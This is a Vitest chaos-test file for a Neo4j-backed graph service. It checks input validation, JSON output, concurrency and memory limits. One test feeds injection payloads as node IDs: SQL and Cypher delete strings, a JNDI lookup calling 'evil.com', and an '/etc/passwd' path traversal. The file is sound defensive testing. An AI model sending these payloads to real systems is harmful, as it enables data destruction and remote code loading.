import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { GraphService } from '../src/services/graph-service';
import { createMockDriver } from './mock-neo4j';
import neo4j from 'neo4j-driver';

describe('REAL CHAOS TESTING - Finding Actual Problems', () => {
  let mockGraphService: GraphService;
  let realGraphService: GraphService | null = null;
  let realDriver: any = null;
  
  beforeAll(async () => {
    const mockDriver = createMockDriver();
    mockGraphService = new GraphService(mockDriver);
    
    try {
      realDriver = neo4j.driver(
        'bolt://localhost:7687',
        neo4j.auth.basic('neo4j', 'graphdone_password'),
        { disableLosslessIntegers: true }
      );
      const session = realDriver.session();
      await session.run('RETURN 1');
      await session.close();
      realGraphService = new GraphService(realDriver);
      console.log('🗄️ Real database available for chaos testing');
    } catch (error) {
      console.log('⚠️ Real database not available');
    }
  });

  afterAll(async () => {
    if (realDriver) {
      await realDriver.close();
    }
  });

  describe('Input Validation Chaos - These SHOULD fail', () => {
    it('should reject absolutely massive strings that could crash the system', async () => {
      const massiveString = 'x'.repeat(10000000); // 10MB string
      
      const services = [mockGraphService];
      if (realGraphService) services.push(realGraphService);

      for (const service of services) {
        try {
          const result = await service.createNode({
            title: massiveString,
            type: 'TASK'
          });
          
          // If this succeeds, the response better be valid
          expect(result).toBeDefined();
          expect(result.content).toBeDefined();
          expect(Array.isArray(result.content)).toBe(true);
          
          const parsed = JSON.parse(result.content[0].text);
          expect(parsed).toBeDefined();
          expect(parsed.node).toBeDefined();
          
          // The title should either be the massive string or truncated intelligently
          const returnedTitle = parsed.node.title;
          expect(typeof returnedTitle).toBe('string');
          
          // If it's not truncated, memory usage will be insane
          if (returnedTitle.length === massiveString.length) {
            console.warn('⚠️ System accepted 10MB string without truncation - potential memory issue');
          }
          
        } catch (error: any) {
          // Errors should be specific and helpful
          expect(error).toBeDefined();
          expect(error.message).toBeDefined();
          expect(typeof error.message).toBe('string');
          expect(error.message.length).toBeGreaterThan(0);
          
          // Should not be generic errors
          expect(error.message).not.toBe('Error');
          expect(error.message).not.toBe('undefined');
          
          console.log(`✅ Properly rejected massive string: ${error.message}`);
        }
      }
    });

    it('should handle circular references without infinite loops or crashes', async () => {
      const circular: any = { name: 'test' };
      circular.self = circular;
      circular.deep = { ref: circular };
      
      const services = [mockGraphService];
      if (realGraphService) services.push(realGraphService);

      for (const service of services) {
        const startTime = Date.now();
        
        try {
          const result = await service.createNode({
            title: 'Circular Test',
            type: 'TASK',
            metadata: circular
          });
          
          const endTime = Date.now();
          const duration = endTime - startTime;
          
          // Should complete quickly (not hang in infinite loop)
          expect(duration).toBeLessThan(1000);
          
          // Response should be valid JSON (not crash JSON.stringify)
          expect(result.content).toBeDefined();
          const parsed = JSON.parse(result.content[0].text);
          expect(parsed).toBeDefined();
          
          // Metadata should be handled safely
          if (parsed.node.metadata) {
            // Should not contain actual circular references in JSON
            expect(() => JSON.stringify(parsed.node.metadata)).not.toThrow();
          }
          
        } catch (error: any) {
          const endTime = Date.now();
          const duration = endTime - startTime;
          
          // Even errors should be fast (not hang)
          expect(duration).toBeLessThan(1000);
          expect(error.message).toBeDefined();
          
          console.log(`✅ Properly handled circular reference: ${error.message}`);
        }
      }
    });

    it('should validate that NaN and Infinity priorities are handled correctly', async () => {
      const problematicNumbers = [
        Number.NaN,
        Number.POSITIVE_INFINITY,
        Number.NEGATIVE_INFINITY,
        1/0,
        -1/0,
        0/0,
        Math.sqrt(-1)
      ];

      const services = [mockGraphService];
      if (realGraphService) services.push(realGraphService);

      for (const service of services) {
        for (const badNumber of problematicNumbers) {
          try {
            const result = await service.updatePriorities({
              node_id: 'test-node',
              priority_executive: badNumber,
              priority_individual: badNumber,
              priority_community: badNumber
            });

            // If it accepts these values, they better be sanitized in the response
            const parsed = JSON.parse(result.content[0].text);
            
            // Check that response doesn't contain raw NaN/Infinity
            const responseText = result.content[0].text;
            expect(responseText).not.toContain('NaN');
            expect(responseText).not.toContain('Infinity');
            
            // Priorities should be valid numbers or null
            if (parsed.priorities) {
              const priorities = [
                parsed.priorities.executive,
                parsed.priorities.individual, 
                parsed.priorities.community
              ];
              
              for (const priority of priorities) {
                if (priority !== null && priority !== undefined) {
                  expect(typeof priority).toBe('number');
                  expect(isFinite(priority)).toBe(true);
                }
              }
            }
            
          } catch (error: any) {
            // Should give meaningful error messages
            expect(error.message).toMatch(/priority|number|invalid|finite/i);
            console.log(`✅ Properly rejected ${badNumber}: ${error.message}`);
          }
        }
      }
    });

    it('should prevent SQL injection attempts in node IDs', async () => {
      const sqlInjections = [
        "'; DROP TABLE WorkItem; --",
        "' OR '1'='1",
        "'; DELETE FROM Graph WHERE '1'='1'; --", 
        "' UNION SELECT * FROM users --",
        "'; MATCH (n) DETACH DELETE n; --",
        "#{1+1}",
        "${jndi:ldap://evil.com}",
        "../../etc/passwd"
      ];

      const services = [mockGraphService];
      if (realGraphService) services.push(realGraphService);

      for (const service of services) {
        for (const injection of sqlInjections) {
          try {
            const result = await service.getNodeDetails({
              node_id: injection
            });

            // If it doesn't fail, response better be safe
            const parsed = JSON.parse(result.content[0].text);
            
            // Should return "not found" not execute injection
            if (parsed.error) {
              expect(parsed.error).toMatch(/not found|invalid|does not exist/i);
            } else if (parsed.node) {
              // Should not return system data
              expect(parsed.node.id).not.toMatch(/admin|root|system|password/i);
            }
            
          } catch (error: any) {
            // Should be validation error, not database error
            expect(error.message).not.toMatch(/syntax error|database|connection/i);
            console.log(`✅ Properly blocked injection: ${injection}`);
          }
        }
      }
    });

    it('should handle concurrent operations without data corruption', async () => {
      const nodeId = `concurrent-test-${Date.now()}`;
      
      // Create conflicting operations
      const operations = [
        () => mockGraphService.createNode({ title: 'Node 1', type: 'TASK' }),
        () => mockGraphService.updatePriorities({ node_id: nodeId, priority_executive: 0.1 }),
        () => mockGraphService.updatePriorities({ node_id: nodeId, priority_executive: 0.9 }),
        () => mockGraphService.updateNode({ node_id: nodeId, title: 'Updated 1' }),
        () => mockGraphService.updateNode({ node_id: nodeId, title: 'Updated 2' }),
        () => mockGraphService.deleteNode({ node_id: nodeId }),
      ];

      // Run them all at once
      const results = await Promise.allSettled(operations.map(op => op()));
      
      // Check for data corruption indicators
      let successCount = 0;
      let errorCount = 0;
      
      for (const result of results) {
        if (result.status === 'fulfilled') {
          successCount++;
          
          // Successful responses should be well-formed
          expect(result.value).toBeDefined();
          expect(result.value.content).toBeDefined();
          
          const parsed = JSON.parse(result.value.content[0].text);
          expect(parsed).toBeDefined();
          
        } else if (result.status === 'rejected') {
          errorCount++;
          
          // Errors should be meaningful
          expect(result.reason).toBeDefined();
          expect(result.reason.message).toBeDefined();
        }
      }
      
      // Should not have all succeed (that would indicate no conflict handling)
      // Should not have all fail (that would indicate system breakdown)
      expect(successCount + errorCount).toBe(operations.length);
      console.log(`Concurrent operations: ${successCount} succeeded, ${errorCount} failed - this is expected`);
    });

    it('should prevent memory exhaustion from large arrays', async () => {
      const startMemory = process.memoryUsage().heapUsed;
      
      try {
        // Create increasingly large arrays until we hit a reasonable limit
        const maxSize = 100000; // 100k items
        const largeArray = Array.from({length: maxSize}, (_, i) => ({
          id: `item-${i}`,
          data: `data-${i}`.repeat(100), // ~800 bytes per item = ~80MB total
          nested: {
            more: `more-data-${i}`,
            timestamp: new Date().toISOString()
          }
        }));

        const result = await mockGraphService.createNode({
          title: 'Memory Test',
          type: 'TASK',
          metadata: { large_array: largeArray }
        });

        const endMemory = process.memoryUsage().heapUsed;
        const memoryIncrease = endMemory - startMemory;
        
        // Should either reject large arrays or handle them efficiently
        if (result) {
          // Memory increase should be reasonable (not 10x the data size)
          const reasonableLimit = largeArray.length * 1000 * 10; // 10x overhead allowance
          if (memoryIncrease > reasonableLimit) {
            throw new Error(`Memory usage increased by ${Math.round(memoryIncrease/1024/1024)}MB - possible memory leak`);
          }
          
          // Response should still be valid
          const parsed = JSON.parse(result.content[0].text);
          expect(parsed).toBeDefined();
        }
        
      } catch (error: any) {
        // Should be a clear resource limit error
        expect(error.message).toMatch(/memory|size|limit|resource/i);
        console.log(`✅ Properly limited memory usage: ${error.message}`);
      }
    });
  });

  describe('Response Validation Chaos - Checking what we actually return', () => {
    it('should always return valid, parseable JSON', async () => {
      const problematicInputs = [
        { title: '"quotes"', type: 'TASK' },
        { title: "single'quotes", type: 'TASK' },
        { title: 'line1\nline2\rline3\r\nline4', type: 'TASK' },
        { title: '\u0000\u0001\u0002null bytes', type: 'TASK' },
        { title: '🚀💀emoji', type: 'TASK' },
      ];

      for (const input of problematicInputs) {
        const result = await mockGraphService.createNode(input);
        
        // Must be parseable JSON
        expect(() => JSON.parse(result.content[0].text)).not.toThrow();
        
        const parsed = JSON.parse(result.content[0].text);
        expect(parsed).toBeDefined();
        
        // Must have expected structure
        expect(parsed.node || parsed.error).toBeDefined();
        
        if (parsed.node) {
          expect(typeof parsed.node.id).toBe('string');
          expect(typeof parsed.node.title).toBe('string');
          expect(typeof parsed.node.type).toBe('string');
        }
      }
    });

    it('should maintain data integrity through round-trip operations', async () => {
      const testData = {
        title: 'Test "Node" with \'quotes\' and\nnewlines',
        description: 'Complex description with 🚀 emoji and numbers: 123.456',
        type: 'TASK',
        metadata: {
          number: 42,
          boolean: true,
          null_value: null,
          array: [1, 'two', true, null],
          nested: { deep: { value: 'test' } }
        }
      };

      // Create node
      const createResult = await mockGraphService.createNode(testData);
      const createdNode = JSON.parse(createResult.content[0].text).node;
      
      // Verify data integrity
      expect(createdNode.title).toBe(testData.title);
      expect(createdNode.description).toBe(testData.description);
      expect(createdNode.type).toBe(testData.type);
      
      if (createdNode.metadata) {
        expect(createdNode.metadata.number).toBe(42);
        expect(createdNode.metadata.boolean).toBe(true);
        expect(createdNode.metadata.null_value).toBeNull();
        expect(Array.isArray(createdNode.metadata.array)).toBe(true);
      }
    });
  });

  describe('Performance Chaos - Timing and Resource Constraints', () => {
    it('should respond within reasonable time limits', async () => {
      const operations = [
        () => mockGraphService.createNode({ title: 'Perf Test', type: 'TASK' }),
        () => mockGraphService.getNodeDetails({ node_id: 'test-node' }),
        () => mockGraphService.listGraphs({ limit: 10 }),
        () => mockGraphService.updatePriorities({ node_id: 'test', priority_executive: 0.5 })
      ];

      for (const operation of operations) {
        const startTime = Date.now();
        
        try {
          await operation();
          const duration = Date.now() - startTime;
          
          // Should complete within reasonable time
          expect(duration).toBeLessThan(2000); // 2 seconds max
          
        } catch (error) {
          const duration = Date.now() - startTime;
          
          // Even errors should be fast
          expect(duration).toBeLessThan(2000);
        }
      }
    });
  });
});